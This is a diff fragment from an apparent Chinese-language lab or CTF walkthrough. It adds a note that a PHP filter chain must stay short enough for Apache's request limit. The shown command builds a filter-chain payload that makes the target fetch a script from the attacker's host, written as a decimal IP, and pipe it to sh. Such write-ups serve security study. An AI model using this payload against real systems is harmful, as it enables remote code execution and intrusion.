@@ -29,7 +29,7 @@ PORT   STATE SERVICE
 
 在 kali 上创建 http web。
 
-生成利用代码：
+生成利用代码(这里要控制 chain 后的长度，否则超过 apache 限制长度执行不了)：
 
 ```
 python3 ~/tools/py-tools/php_filter_chain_generator.py --chain '<?=`wget -q -O- 3232236803/8|sh`;?>'
